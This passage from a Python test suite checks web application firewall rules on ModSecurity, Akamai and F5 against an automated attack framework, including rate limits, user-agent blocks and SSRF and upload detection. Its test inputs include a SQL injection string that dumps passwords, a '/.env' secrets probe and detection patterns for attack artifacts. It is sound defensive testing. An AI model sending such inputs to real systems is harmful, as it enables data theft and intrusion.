        engine = self.engines["main"]
        for index, (name, request, rule_id) in enumerate(NOT_LOGGED_CASES):
            with self.subTest(name):
                src = "127.7.9.%d" % (index + 1)
                since = len(engine.log())
                self.assertEqual(engine.request(src=src, **request), 200)
                self.assertEqual(engine.request(src=src, headers={"isCliRequest": "true"}), 200)
                self.assertTrue(self.logged(engine, "9907013", since), "the marker request was not logged")
                self.assertNotIn('id "%s"' % rule_id, engine.log()[since:])

    def test_artex_named_in_the_user_agent(self):
        # Every user-agent in F5 Labs' appendix that carries the framework's name is refused.
        named = [u for u in F5LABS_USER_AGENTS if re.search(ARTEX_NAME, u)]
        self.assertEqual(len(named), 44)
        for index, ua in enumerate(named):
            with self.subTest(ua):
                self.assertEqual(self.engines["main"].request(ua=ua, src="127.7.6.%d" % (index + 1)), 403)

    def test_error_rate_trips_after_thirty(self):
        engine, src = self.engines["main"], "127.7.3.1"
        self.assertEqual({engine.request(path="/nope-%d" % i, src=src) for i in range(30)}, {404})
        self.assertEqual(engine.request(src=src), 200)
        engine.request(path="/nope-x", src=src)
        self.assertEqual(engine.request(src=src), 429)

    def test_repeat_violator_counts_phase_two_denials(self):
        engine, src = self.engines["main"], "127.7.3.2"
        self.assertEqual({engine.request(path="/zzz-nonexistent-%d" % i, src=src) for i in range(5)}, {403})
        self.assertEqual(engine.request(src=src), 200)
        engine.request(path="/zzz-nonexistent-x", src=src)
        self.assertEqual(engine.request(src=src), 429)

    def test_repeat_violator_counts_phase_one_denials(self):
        # REGRESSION: the collection was opened after the phase 1 rules, so these never counted.
        engine = self.engines["main"]
        for src, request, status in (("127.7.3.3", dict(ua="artex-enrich/1.0"), 403), ("127.7.3.4", dict(path="/.env"), 404)):
            with self.subTest(src):
                self.assertEqual({engine.request(src=src, **request) for _ in range(6)}, {status})
                self.assertEqual(engine.request(src=src), 429)

    def test_application_403s_are_not_waf_denials(self):
        # REGRESSION: eight 403s from the origin earned the 30-minute penalty box.
        engine, src = self.engines["main"], "127.7.3.5"
        self.assertEqual({engine.request(path="/forbidden", src=src) for _ in range(8)}, {403})
        self.assertEqual(engine.request(src=src), 200)

    def test_login_failures_trip_after_ten(self):
        engine, src = self.engines["main"], "127.7.3.6"
        self.assertEqual({engine.request(method="POST", path="/signin", body="a=b", src=src) for _ in range(10)}, {401})
        self.assertEqual(engine.request(src=src), 200)
        engine.request(method="POST", path="/signin", body="a=b", src=src)
        self.assertEqual(engine.request(src=src), 429)

    def test_login_failures_count_whatever_the_path_looks_like(self):
        # REGRESSION: "//signin" and "/./signin" reached the anchored path test as sent on nginx.
        engine, src = self.engines["main"], "127.7.3.8"
        for i in range(11):
            engine.request(method="POST", path=("//signin", "/./signin")[i % 2], body="a=b", src=src)
        self.assertEqual(engine.request(src=src), 429)

    def test_signup_limit_refuses_signups_and_nothing_else(self):
        # REGRESSION: the fourth sign-up made every request from the address return 429.
        engine, src = self.engines["main"], "127.7.3.7"
        self.assertEqual({engine.request(method="POST", path="/signup", body="a=b", src=src) for _ in range(3)}, {200})
        self.assertEqual(engine.request(method="POST", path="/signup", body="a=b", src=src), 429)
        self.assertEqual(engine.request(src=src), 200)

    def test_signup_limit_counts_whatever_the_path_looks_like(self):
        engine, src = self.engines["main"], "127.7.3.9"
        for path in ("//signup", "/signup/", "/./signup"):
            engine.request(method="POST", path=path, body="a=b", src=src)
        self.assertEqual(engine.request(method="POST", path="/signup", body="a=b", src=src), 429)

    def test_every_window_ends(self):
        # REGRESSION, for all four counters: with the expiry re-armed on every hit (or never armed),
        # a counter fed every 3 seconds outlives its 4-second window and trips. Four rounds, 3
        # seconds apart; no window holds more than two rounds, and two rounds stay under each
        # threshold, so nothing may trip. In the `timed` copy, where a penalty lasts one second:
        # a trip is over before the next round, so every response is checked, and one more
        # request is sent straight after each round to catch a trip on the round's last event.
        engine = self.engines["timed"]
        sources = {"error rate": "127.7.4.1", "repeat violator": "127.7.4.2", "login failures": "127.7.4.3",
                   "sign-ups": "127.7.4.4"}
        seen = {name: set() for name in sources}
        for round_number in range(4):
            if round_number:
                time.sleep(3)
            for i in range(12):
                seen["error rate"].add(engine.request(path="/nope-%d-%d" % (round_number, i), src=sources["error rate"]))
            for i in range(2):
                seen["repeat violator"].add(engine.request(path="/zzz-nonexistent-%d-%d" % (round_number, i),
                                                           src=sources["repeat violator"]))
            for i in range(4):
                seen["login failures"].add(engine.request(method="POST", path="/signin", body="a=b", src=sources["login failures"]))
            seen["sign-ups"].add(engine.request(method="POST", path="/signup", body="a=b", src=sources["sign-ups"]))
            for name, src in sources.items():
                seen[name].add(engine.request(src=src))
        self.assertEqual(seen, {"error rate": {404, 200}, "repeat violator": {403, 200}, "login failures": {401, 200},
                                "sign-ups": {200}})

    def test_a_tripped_counter_is_cleared_and_the_penalty_ends(self):
        # Without the clear, the counter stays over its threshold for the rest of its window and
        # re-arms the penalty on every request the client makes. In the `timed` copy the penalty
        # (1 s) is shorter than the window (4 s), so that shows: the first request after the
        # penalty would be served and the second refused again.
        engine = self.engines["timed"]
        trips = (("error rate", "127.7.4.5", lambda s: [engine.request(path="/nope-%d" % i, src=s) for i in range(31)]),
                 ("repeat violator", "127.7.4.6", lambda s: [engine.request(path="/zzz-nonexistent-%d" % i, src=s) for i in range(6)]),
                 ("login failures", "127.7.4.7", lambda s: [engine.request(method="POST", path="/signin", body="a=b", src=s) for _ in range(11)]))
        for name, src, trip in trips:
            trip(src)
            with self.subTest(name + ": boxed"):
                self.assertEqual(engine.request(src=src), 429)
        time.sleep(2.5)
        for name, src, _ in trips:
            with self.subTest(name + ": served again, and still served"):
                self.assertEqual([engine.request(src=src), engine.request(src=src)], [200, 200])


class _CoreRuleSetCases:
    """The rule file after the Core Rule Set, which is how its header says to deploy it."""

    SQLI = "/search?q=1%27%20OR%201%3D1%20UNION%20SELECT%20password%20FROM%20users--"

    def test_the_core_rule_set_still_blocks(self):
        # REGRESSION: the recipe once given for counting Core Rule Set blocks turned them off on v3.
        for name in ("main", "counting"):
            with self.subTest(name):
                self.assertEqual(self.engines[name].request(path=self.SQLI, src="127.7.10.1"), 403)
                self.assertEqual(self.engines[name].request(src="127.7.10.2"), 200)

    def test_rotating_the_user_agent_does_not_reset_the_counters(self):
        # REGRESSION: with the counters in the collection the Core Rule Set keys on the
        # User-Agent, eight denials under eight user-agents were never boxed on v2.
        engine, src = self.engines["main"], "127.7.10.3"
        for i in range(8):
            engine.request(path="/zzz-nonexistent-%d" % i, ua="Mozilla/5.0 rotate/%d" % i, src=src)
        self.assertEqual(engine.request(ua="Mozilla/5.0 rotate/final", src=src), 429)

    def test_core_rule_set_blocks_are_counted_only_when_asked(self):
        for name, want in (("main", 200), ("counting", 429)):
            with self.subTest(name):
                engine, src = self.engines[name], "127.7.10.4"
                self.assertEqual({engine.request(path=self.SQLI + str(i), src=src) for i in range(6)}, {403})
                self.assertEqual(engine.request(src=src), want)


class ApacheModSecurityV2(_ModSecurityCases, _EngineCase, unittest.TestCase):
    engine_type, engine_label = ApacheEngine, "Apache httpd with mod_security2"

    @classmethod
    def copies(cls):
        # v2 needs the stream block for W-AGT-009; `main` proves the documented recipe.
        return {"main": dict(v2_stream_block=True), "timed": dict(timed=True)}

    def test_the_file_loads_exactly_as_shipped(self):
        # REGRESSION: it did not. The copies above are edited for the test; this one is not.
        engine = ApacheEngine(self.base, "asis")
        shipped = self.base / "rules-asis"
        shipped.mkdir()
        for name in LISTS + ("modsecurity-agentic.conf",):
            shutil.copy(WAF / name, shipped / name)
        code, output = engine.check(shipped / "modsecurity-agentic.conf", self.docroot)
        self.assertEqual(code, 0, output)

    def test_dtd_in_an_xml_body_is_refused_with_the_v2_block(self):
        for index, ctype in enumerate(("application/xml", "application/XML", "Text/Xml")):
            with self.subTest(ctype):
                self.assertEqual(self.engines["main"].request(**post(XML_DTD, ctype), src="127.7.5.%d" % (index + 1)), 403)

    def test_dtd_rule_is_blind_on_v2_without_the_v2_block(self):
        # Not a wish: the limitation the rule file documents. v2 leaves REQUEST_BODY empty once the
        # XML body processor is selected, so the portable rule cannot see the DTD. If this starts
        # returning 403 the engine changed and the commented block (and its README note) can go.
        self.assertEqual(self.engines["timed"].request(**post(XML_DTD, "application/xml"), src="127.7.5.9"), 200)


class NginxModSecurityV3(_ModSecurityCases, _EngineCase, unittest.TestCase):
    engine_type, engine_label = NginxEngine, "nginx with the ModSecurity v3 connector"
    server_normalized_status = 400

    @classmethod
    def copies(cls):
        return {"main": dict(), "timed": dict(timed=True)}

    def test_dtd_in_an_xml_body_is_refused(self):
        # v3 fills REQUEST_BODY under the XML body processor, so the portable rule is enough.
        for index, ctype in enumerate(("application/xml", "application/XML", "Text/Xml")):
            with self.subTest(ctype):
                self.assertEqual(self.engines["main"].request(**post(XML_DTD, ctype), src="127.7.5.%d" % (index + 1)), 403)


class ApacheWithCoreRuleSet(_CoreRuleSetCases, _EngineCase, unittest.TestCase):
    engine_type, engine_label, with_crs = ApacheEngine, "Apache httpd with mod_security2", True

    @classmethod
    def copies(cls):
        return {"main": dict(), "counting": dict(count_crs_blocks=True)}


class NginxWithCoreRuleSet(_CoreRuleSetCases, _EngineCase, unittest.TestCase):
    engine_type, engine_label, with_crs = NginxEngine, "nginx with the ModSecurity v3 connector", True

    @classmethod
    def copies(cls):
        return {"main": dict(), "counting": dict(count_crs_blocks=True)}


# Akamai has no engine to load, so W-AGT-004 and W-AGT-008 are read by a stand-in of the match
# conditions they use: '*' is any run of characters and '?' exactly one, valueCase false folds
# case, and an argument condition named '*' reads every argument. One assumption the rule's own
# shape makes is written down rather than hidden: filenameMatch reads the last path segment without
# its extension, which extensionMatch reads (otherwise the two conditions of W-AGT-008 could
# never both hold). Each case is (rule, request, should it match).
AKAMAI_CASES = [
    ("W-AGT-004a", dict(path="/_i6084_probe_missing"), True),
    ("W-AGT-004a", dict(path="/status/liveness_probe_missing"), False),
    ("W-AGT-004b", dict(path="/cb", query="u=http%3A%2F%2Fh%2F_i49_probe_missing"), True),
    ("W-AGT-004b", dict(path="/cb", query="u=http%3A%2F%2Fh%2F_i6084_probe_missing&x=1"), True),
    ("W-AGT-004b", dict(path="/cb", query="u=http%3A%2F%2Fh%2Fliveness_probe_missing"), False),
    ("W-AGT-004b", dict(path="/cb", query="u=http%3A%2F%2Fh%2F_i6_probe_missing"), False),
    ("W-AGT-004c", dict(path="/cb", form="u=http%3A%2F%2Fh%2F_i808807_probe_missing"), True),
    ("W-AGT-004c", dict(path="/cb", form="u=http%3A%2F%2Fh%2Fliveness_probe_missing"), False),
    ("W-AGT-008", dict(path="/up/i4028.asp"), True),
    ("W-AGT-008", dict(path="/up/i0123.php"), True),
    ("W-AGT-008", dict(path="/up/i808807.jsp"), True),
    ("W-AGT-008", dict(path="/up/i1234567.PHP"), True),
    ("W-AGT-008", dict(path="/i18.php"), False),
    ("W-AGT-008", dict(path="/i12345678.php"), False),
    ("W-AGT-008", dict(path="/i4028.html"), False),
] + [("W-AGT-008", dict(path="/%s.php" % name), False)
     for name in ("index", "info", "image", "items", "inbox", "install", "include", "invoice", "imports",
                  "inquiry", "includes", "identity", "insights")]


def akamai_wildcard(pattern, value, case=False):
    rx = "".join(".*" if c == "*" else "." if c == "?" else re.escape(c) for c in pattern)
    return re.fullmatch(rx, value, re.S | (0 if case else re.I)) is not None


def akamai_condition(cond, req):
    from urllib.parse import parse_qsl, unquote
    path = unquote(req["path"])
    segment = path.rsplit("/", 1)[-1]
    stem, dot, ext = segment.rpartition(".")
    if not dot:
        stem, ext = segment, ""
    kind = cond["type"]
    if kind in ("uriQueryMatch", "argsPostMatch"):
        if cond["name"] != "*":
            raise AssertionError("the stand-in reads only conditions named '*'")
        args = parse_qsl(req.get("query" if kind == "uriQueryMatch" else "form", ""), keep_blank_values=True)
        values = [v for _, v in args]
    elif kind == "pathMatch":
        values = [path]
    elif kind == "filenameMatch":
        values = [stem]
    elif kind == "extensionMatch":
        values = [ext]
    else:
        raise AssertionError("the stand-in does not model %s" % kind)
    wildcard = cond.get("valueWildcard", False)
    hit = any((akamai_wildcard(p, v, cond.get("valueCase", False)) if wildcard
               else (p == v if cond.get("valueCase", False) else p.lower() == v.lower()))
              for p in cond["value"] for v in values)
    return hit == cond.get("positiveMatch", True)


class AkamaiStandInTests(unittest.TestCase):
    """No engine: the Akamai rules are JSON for Akamai's builder. These cases run W-AGT-004 and
    W-AGT-008 as the file ships them through the stand-in above."""

    @classmethod
    def setUpClass(cls):
        import json
        doc = json.loads((WAF / "akamai-custom-rules.json").read_text())
        cls.rules = {e["rule"]["name"].split(" ")[0]: e["rule"] for e in doc["customRules"]}

    def matches(self, key, req):
        rule = self.rules[key]
        self.assertEqual(rule["operation"], "AND", key)
        return all(akamai_condition(c, req) for c in rule["conditions"])

    def test_each_case(self):
        for key, req, want in AKAMAI_CASES:
            with self.subTest(rule=key, req=req):
                self.assertEqual(self.matches(key, req), want)

    def test_the_ssrf_canary_is_read_wherever_the_other_platforms_read_it(self):
        # ModSecurity reads it in REQUEST_URI, ARGS and the body, F5 in the URI and the body; the
        # Akamai copy was in the path rule only, where a URL inside a parameter never appears.
        for key in ("W-AGT-004a", "W-AGT-004b", "W-AGT-004c"):
            values = self.rules[key]["conditions"][0]["value"]
            self.assertEqual([v for v in values if "probe_missing" in v],
                             ["*_i" + "?" * n + "_probe_missing*" for n in range(2, 8)], key)

    def test_the_task_artifact_name_starts_with_a_digit(self):
        # '?' is any character, so the values i??? to i??????? matched index.php and install.php.
        values = self.rules["W-AGT-008"]["conditions"][0]["value"]
        self.assertEqual(len(values), 50)
        for v in values:
            self.assertRegex(v, r"^i[0-9]\?{2,6}$")


class IRuleLogicTests(unittest.TestCase):
    def test_every_case_passes_in_the_stand_in_runtime(self):
        tclsh = None if SKIP else shutil.which("tclsh")
        if not tclsh:
            engine_missing("tclsh is not installed")
        here = pathlib.Path(__file__).resolve().parent / "waf"
        run = subprocess.run([tclsh, str(here / "irule_runtime.tcl"), str(WAF / "f5-irule-agentic.tcl"),
                              str(WAF / "f5-data-groups.tmsh"), str(here / "irule_cases.tcl")],
                             capture_output=True, text=True, timeout=120)
        self.assertEqual(run.returncode, 0, run.stdout + run.stderr)
        summary = re.search(r"^failures: (\d+) of (\d+)$", run.stdout, re.M)
        self.assertIsNotNone(summary, run.stdout + run.stderr)
        self.assertGreater(int(summary.group(2)), 130, "the case file lost most of its cases")
        self.assertEqual(int(summary.group(1)), 0, run.stdout)

    def test_data_groups_the_rule_reads_are_the_ones_defined(self):
        # No engine needed. The first version defined three groups the rule never read.
        rule = (WAF / "f5-irule-agentic.tcl").read_text()
        defined = set(re.findall(r"^create ltm data-group internal (\S+) ", (WAF / "f5-data-groups.tmsh").read_text(), re.M))
        read = set(re.findall(r"class match -- .*? (?:contains|equals|ends_with|starts_with) (\w+)\]", rule))
        self.assertEqual(defined, read)
        self.assertNotRegex(rule, r"class match (?!-- )", "class match on request data without -- to end option parsing")


if __name__ == "__main__":
    unittest.main()
